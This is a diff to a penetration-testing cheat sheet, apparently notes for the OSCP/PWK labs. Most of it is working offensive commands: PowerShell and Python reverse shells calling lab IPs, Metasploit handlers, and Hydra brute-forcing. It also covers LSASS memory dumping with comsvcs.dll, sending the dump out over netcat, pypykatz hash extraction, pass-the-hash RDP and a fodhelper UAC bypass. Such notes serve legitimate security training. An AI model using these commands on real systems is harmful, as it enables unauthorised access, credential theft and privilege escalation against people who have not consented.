@@ -17,11 +17,19 @@ sudo nmap --min-rate 100 -T4 -p- $ip -Pn -oA nmap/all
 # service version on specific ports
 sudo nmap --min-rate 100 -T4 $ip -Pn -p30021,33033,44330,45332,45443 -sC -sV 
 ```
+For brevity in the exam we can use [nmapAutomator](https://github.com/21y4d/nmapAutomator).
 
-`nmapAutomator.sh -H $ip -t vulns`
-`nmapAutomator.sh -H $ip -t all`
+```bash
+# vuln scan
+nmapAutomator.sh -H $ip -t vulns
+
+# all scan
+nmapAutomator.sh -H $ip -t all
+```
 
 ## Web
+
+### Directory enumeration
 
 ```bash
 dirsearch -u http://192.168.113.58 -x 403,400,404 -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -R 2 -e php
@@ -46,22 +54,23 @@ smbclient //$IP/ipc$ -U $username
 mount -t cifs //$IP/$shared_folder $mount_folder
 ```
 
-# Reverse shell
+# Reverse shells
 
-PowerShell revshell one liner
+PowerShell one liner
 ```powershell
 powershell.exe -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.210',443);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
 ```
 
-Meterpreter listener setup in one line
+Msfconsole listener setup in one line
 ```bash
 # Meterpreter
 msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 443; run; exit -y"
+
 # Java
 msfconsole -q -x "use exploit/multi/handler; set PAYLOAD java/jsp_shell_reverse_tcp; set LHOST tun0; set LPORT 443; run; exit -y"
 ```
 
-Escaping quotes
+Escaped quotes example e.g. when executing through a command line RCE exploit we might need to be careful of quotes.
 ```bash
 "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.118.6\",15672));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
 ```
@@ -70,36 +79,57 @@ Escaping quotes
 
 ## Windows
 
-**SMB server** on Linux
-`sudo impacket-smbserver data .`
+### SMB 
 
-On Windows shell
-`copy \\192.168.119.250\workgroup\test.bat`
-Can upload and download from Windows this way.
-
-**FTP**
-Start FTP server `python3 -m pyftpdlib -w -p 21
+SMB server hosted on Linux using `impacket`.
 
 ```bash
-# Recursively download whole ftp directories
+sudo impacket-smbserver data .
+```
+
+On a Windows shell we can simply copy files to and from the network share.
+
+```powershell
+# cmd
+copy \\192.168.119.250\data\test.bat
+
+# PowerShell
+Copy-Item \\192.168.119.250\data\nc64.exe C:\Users\Public\.
+```
+
+We can easily upload and download from Windows this way.
+
+### FTP
+
+Start FTP server on Kali with python.
+
+```bash
+python3 -m pyftpdlib -w -p 21
+```
+
+On the Windows box we can enter an interactive FTP shell as normal `ftp user@ip` and upload the files needed.
+
+We can use wget to recursively download whole FTP directories:
+
+```bash
 wget -m --no-parent --no-passive ftp://username:password@IP
 ```
 
 ## Linux
-curl/wget
 
-If firewall blocks HTTP connections and we have a low-priv shell, generate SSH keys and use scp.
+If firewall rules blocks HTTP connections and we have a low-privilege shell, we can generate SSH keys with `ssh-keygen`, add them to the Kali authorized keys file, and use `scp` for file transfer. This is not particularly OPSEC-safe but is fine for PWK labs.
 
-Firewall rules preventing file transfer, so generated SSH keys on the target and added to the Kali authorized keys file. Then we can transfer files with scp e.g.
 ```bash 
-scp -i /var/lib/postgresql/.ssh/id_rsa kali@192.168.49.171:/home/kali/Documents/oscp/provingGrounds/nibbles/linpeas.sh /tmp/
+scp -i /var/lib/postgresql/.ssh/id_rsa kali@192.168.49.171:/home/kali/tools/linpeas.sh /tmp/
 ```
 
 # Tools
 ## Hydra
 
 HTTP-Post-Form
-`sudo hydra -l dj -P /usr/share/wordlists/rockyou.txt 10.11.1.128 -s 4167 http-post-form "/loginform.asp:uname=^USER^&psw=^PASS^:Internal server error."`
+```bash
+sudo hydra -l dj -P /usr/share/wordlists/rockyou.txt 10.11.1.128 -s 4167 http-post-form "/loginform.asp:uname=^USER^&psw=^PASS^:Internal server error."
+```
 
 
 # Credential Dumping
@@ -128,7 +158,8 @@ MiniDump is a useful technique to have in the back of your mind in case any issu
 
 First we need to find the PID of `lsass.exe`:
 
-```
+```powershell
+tasklist | Select-String lsass
 ```
 
 Then we can execute MiniDump.
@@ -136,25 +167,39 @@ Then we can execute MiniDump.
 C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump [PID] C:\temp\out.dmp full
 ```
 
-Transfer DMP via Netcat.
+Transfer DMP via Netcat (or otherwise). This command won't exit out nicely when the transfer is finished, so we will need to manually check the file size on the disk of the attacking machine until it is complete.
 
 ```powershell
-WIP
+# on victim
+nc.exe -vn 192.168.119.215 4444 < C:\Users\Public\lsass.dmp
+
+# on attacker
+nc -nvlp 4444 > lsass.dmp
 ```
 
-Use pypykatz.
+Use `pypykatz` to extract the NTLM hashes.
 ```bash
-WIP
+pypykatz lsa minidump lsass.dmp
 ```
 
 ## Task Manager
 
-Remember if all else fails and we have RDP access to the target machine, we can dump the process memory of LSASS from Task Manager. 
+Remember if all else fails and we have RDP access to the target machine, we can dump the process memory of LSASS from Task Manager.
 
-## Pass the hash
+![]({{site.baseurl}}/assets/resources/Pasted%20image%2020220313154727.png)
 
-RDP
-`xfreerdp /u:nicky /d:thinc /pth:b40c7060e1bf68227131564a1bf33d48 /v:10.11.1.223`
+The DMP file by default is output to `%temp%\lsass.DMP`, which will expand to `C:\Users\<user>\AppData\Local\Temp\lsass.DMP`.
+
+# Lateral Movement
+
+### PsExec
+
+
+### RDP
+
+```bash
+xfreerdp /u:bob /d:thinc /pth:b40c7060e1bf6g227131564a7bf33d48 /v:10.11.1.1
+```
 
 # Pivoting 
 ## Port forwarding
@@ -233,26 +278,19 @@ Fodhelper and Eventvwr (check SVcorp notes)
 where /r C:\Windows fodhelper.exe
 ```
 
+Exploit `fodhelper.exe` UAC bypass.
 ```powershell
-#This UAC bypass tries to execute your command with elevated privileges using fodhelper.exe
-
-$yourevilcommand = "C:\Windows\System32\cmd.exe"
-
-#Adding all the reistry required with your command.
-
+$c = "C:\Windows\System32\cmd.exe"
 New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
 New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
-Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $yourevilcommand -Force
-
-#Starts the fodhelper process to execute your command.
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $c -Force
 
 Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
 
-#Cleaning up the mess created.
 Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
 ```
 
-# Buffer overflow
+# Buffer Overflow
 
 ```bash
 msf-pattern_create -l $length
